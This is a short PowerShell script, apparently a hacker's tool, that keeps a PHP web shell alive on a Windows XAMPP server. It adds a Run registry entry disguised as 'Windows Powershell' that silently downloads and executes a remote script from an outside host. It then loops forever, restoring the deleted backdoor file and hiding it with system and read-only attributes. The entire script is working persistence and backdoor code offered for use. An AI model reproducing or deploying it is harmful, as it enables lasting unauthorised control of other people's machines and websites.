# Date : 2017-06-02
# Author : ub3r
# Version : 1.0
$shell_path = "G:\xampp\htdocs\backdoor\shell.php"
$shell_content = [System.IO.File]::ReadAllBytes($shell_path)
$autorunKeyName = "Windows Powershell"
$autorunKeyVal = "powershell.exe -nop -windowstyle hidden -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://ub3r.cn/tools/backd00r/Backd00r-webshell.ps1');Backd00r-webshell.ps1"""
$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
if (-not $autoruns.$autorunKeyName) {
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
while($true){
    $flag = Test-Path $shell_path
    if($flag -eq "True"){ sleep 1 }
    else{
        [System.IO.File]::WriteAllBytes($shell_path, $shell_content)
        $shell = Get-Item $shell_path
        $shell.Attributes = "Readonly","system","notcontentindexed","hidden","archive"
        sleep 1
    }
}
